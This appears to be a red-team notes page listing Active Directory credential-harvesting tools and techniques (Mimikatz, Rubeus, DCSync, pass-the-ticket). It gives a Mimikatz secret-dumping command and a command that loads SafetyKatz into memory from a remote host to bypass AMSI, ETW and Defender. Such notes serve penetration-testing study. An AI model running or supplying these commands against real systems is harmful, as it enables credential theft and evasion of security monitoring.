## Active Directory Credential Harvesting (Tools of the trade)
- Mimikatz
- SafetyKatz
- BetterSafetykatz
- Rubeus 
- FlangVik NetLoader (This is not credential harvesting tool, this rather works as a container to host a process to bypass AMSI and ETW which helps in avoiding detection of credentail harvesting tools) 

## Active Directory Credential Harvesting (Techniques)
- Credential Capture
    - `lsadump::secrets` Service Account clear-text passwords 
- Over-Pass The Hash
- Pass The Ticket
- DCSync
- Bypassing AMSI and ETW via FlangVik NetLoader
    - `Loader.exe -path http://127.0.0.1/SafetyKatz.exe sekurlsa::ekeys exit` (Assuming port forwarding is set, here SafetyKatz.exe is downloaded in memory from remote source, command are executed afterwards. Without port forwrding also works, but Windows Defender behavioural detection would block the download. Hence, it is advised to setup [port forwarding](AD_LateralMovement.md) before)